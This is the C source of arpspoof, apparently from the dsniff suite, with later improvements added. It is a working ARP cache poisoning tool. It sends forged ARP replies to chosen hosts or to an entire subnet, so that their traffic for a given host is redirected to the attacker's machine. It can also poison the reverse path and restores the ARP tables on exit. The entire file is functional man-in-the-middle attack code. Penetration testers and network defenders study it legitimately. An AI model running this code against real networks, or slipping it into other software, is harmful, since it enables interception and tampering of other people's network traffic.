/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 *
 * Improved 2011 by Stefan Tomanek <stefa@pico.ruhr.de>
 */

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "arp.h"
#include "version.h"

/* time to wait between ARP packets */
#define ARP_PAUSE 100000

extern char *ether_ntoa(struct ether_addr *);

struct host {
	in_addr_t ip;
	struct ether_addr mac;
	uint8_t flags;
};

/* host flags */
#define HOST_ACTIVE (1<<0)
#define HOST_SUBNET (1<<1)

static libnet_t *l;
static struct host spoof = {0};
static int n_targets = 0;
static struct host *targets;
static char *intf;
static int poison_reverse;

static uint8_t *my_ha = NULL;
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";
static uint8_t *zero_ha = "\0\0\0\0\0\0";

static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-s network/prefixlength] [-r] host\n");
	exit(1);
}

static int
arp_send(libnet_t *l, int op,
	u_int8_t *sha, in_addr_t spa,
	u_int8_t *tha, in_addr_t tpa,
	u_int8_t *me)
{
	int retval;

	if (!me) me = sha;

	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
			     tha, (u_int8_t *)&tpa, l);
	libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
	
	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)me));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	retval = libnet_write(l);
	if (retval)
		fprintf(stderr, "%s", libnet_geterror(l));

	libnet_clear_packet(l);

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
#endif
		usleep(10000);
	}
	while (i++ < 3);

	return (0);
}

static int arp_find_all() {
	struct host *target = targets;
	while(target->ip) {
		if (arp_find(target->ip, &target->mac)) {
			return 1;
		}
		target++;
	}

	return 0;
}

static int target_add(in_addr_t addr, uint8_t flags) {
	targets[n_targets].ip = addr;
	targets[n_targets].flags = flags;
	targets[n_targets+1].ip = (uint32_t)0;
	return n_targets++;
}

static int subnet_add(in_addr_t addr, int prefix_length) {
	uint32_t mask = ~((1<<(32-prefix_length))-1);
	uint32_t net = (ntohl((uint32_t)addr)) & mask;
	uint32_t brd = (ntohl((uint32_t)addr)) | ~mask;
	uint32_t a;
	for (a = net+1; a<brd; a++) {
		in_addr_t ia = (in_addr_t) htonl(a);
		target_add(ia, HOST_SUBNET);
	}
}

static int active_targets(void) {
	int n = 0;
	struct host *target = targets;
	for (; target->ip; target++) if (target->flags & HOST_ACTIVE) n++;
	return n;
}

static void
cleanup(int sig)
{
	int fw = arp_find(spoof.ip, &spoof.mac);
	int bw = poison_reverse && targets[0].ip && arp_find_all();
	int i;
	int rounds = (cleanup_src_own*5 + cleanup_src_host*5);

	fprintf(stderr, "Cleaning up and re-arping targets...\n");
	for (i = 0; i < rounds; i++) {
		struct host *target = targets;
		for(;target->ip;target++) {
			uint8_t *src_ha = NULL;

			if (!(target->flags & HOST_ACTIVE)) continue;

			if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
				src_ha = my_ha;
			}
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			if (fw) {
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&spoof.mac, spoof.ip,
					 (target->ip ? (u_int8_t *)&target->mac : brd_ha),
					 target->ip,
					 src_ha);
				/* we have to wait a moment before sending the next packet */
				usleep(ARP_PAUSE);
			}
			if (bw) {
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&target->mac, target->ip,
					 (u_int8_t *)&spoof.mac,
					 spoof.ip,
					 src_ha);
				usleep(ARP_PAUSE);
			}
		}
	}

	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int c;
	int n_scan_targets = 0;
	char *scan_prefix = NULL;
	int scan_prefix_length = 32;
	char *cleanup_src = NULL;
	in_addr_t target_addr;

	spoof.ip = 0;
	intf = NULL;
	poison_reverse = 0;
	n_targets = 0;

	/* allocate enough memory for target list */
	targets = calloc( argc+1, sizeof(struct host) );

	while ((c = getopt(argc, argv, "ri:s:t:c:h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 't':
			target_addr = libnet_name2addr4(l, optarg, LIBNET_RESOLVE);
			if (target_addr == -1) {
				usage();
			} else {
				target_add(target_addr, 0);
			}
			break;
		case 'r':
			poison_reverse = 1;
			break;
		case 's':
			scan_prefix = strchr(optarg, '/');
			if (scan_prefix) {
				*scan_prefix = '\0';
				scan_prefix_length = atoi(scan_prefix+1);
				if (scan_prefix_length < 0 || scan_prefix_length > 32) {
					usage();
				}
			}
			n_scan_targets += (1<<(32-scan_prefix_length));
			/* we need some more memory to store the target data */
			int mem = (argc+1 + n_scan_targets) * sizeof(struct host);
			targets = realloc( targets, mem );
			targets[n_targets].ip = (uint32_t)0;
			subnet_add(inet_addr(optarg), scan_prefix_length);
			break;
		case 'c':
			cleanup_src = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();

	if (poison_reverse && !n_targets) {
		errx(1, "Spoofing the reverse path (-r) is only available when specifying at least one target (-t/-s).");
		usage();
	}

	if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
		/* only use our own hw address when cleaning up,
		 * not jeopardizing any bridges on the way to our
		 * target
		 */
		cleanup_src_own = 1;
		cleanup_src_host = 0;
	} else if (strcmp(cleanup_src, "host")==0) {
		/* only use the target hw address when cleaning up;
		 * this can screw up some bridges and scramble access
		 * for our own host, however it resets the arp table
		 * more reliably
		 */
		cleanup_src_own = 0;
		cleanup_src_host = 1;
	} else if (strcmp(cleanup_src, "both")==0) {
		cleanup_src_own = 1;
		cleanup_src_host = 1;
	} else {
		errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
		usage();
	}

	if ((spoof.ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)
		usage();
	
	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
		errx(1, "%s", pcap_ebuf);
	
	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
		errx(1, "%s", libnet_ebuf);

	printf("Scanning %d hw addresses...\n", n_targets);
	struct host *target = targets;
	for (; target->ip; target++) {
		int arp_status = arp_find(target->ip, &target->mac);
		if (arp_status &&
				/* just make sure we are not getting an empty or broadcast address */
				(memcmp(&target->mac, zero_ha, sizeof(struct ether_addr)) != 0) &&
				(memcmp(&target->mac, brd_ha, sizeof(struct ether_addr)) != 0)) {
			target->flags |= HOST_ACTIVE;
			if (target->flags & HOST_SUBNET) {
				printf("Found host in subnet %s: %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE), ether_ntoa((struct ether_addr *)&target->mac));
			}
		} else {
			target->flags &= (~HOST_ACTIVE);
			if (! (target->flags & HOST_SUBNET)) {
				printf("Unable to find specified host %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
			}
		}
	}

	if (poison_reverse) {
		if (!arp_find(spoof.ip, &spoof.mac)) {
			errx(1, "couldn't arp for spoof host %s",
			     libnet_addr2name4(spoof.ip, LIBNET_DONT_RESOLVE));
		}
	}

	if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
		errx(1, "Unable to determine own mac address");
	}

	if (active_targets() == 0) {
		errx(1, "No target hosts found.");
	}

	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	for (;;) {
		struct host *target = targets;
		for(;target->ip; target++) {
			if (!(target->flags & HOST_ACTIVE)) continue;
			/* do not target our spoof host! */
			if (target->ip != spoof.ip) {
				arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
					(target->ip ? (u_int8_t *)&target->mac : brd_ha),
					target->ip,
					my_ha);
				usleep(ARP_PAUSE);
				if (poison_reverse) {
					arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
					usleep(ARP_PAUSE);
				}
			}
		}

		sleep(2);
	}
	/* NOTREACHED */

	exit(0);
}
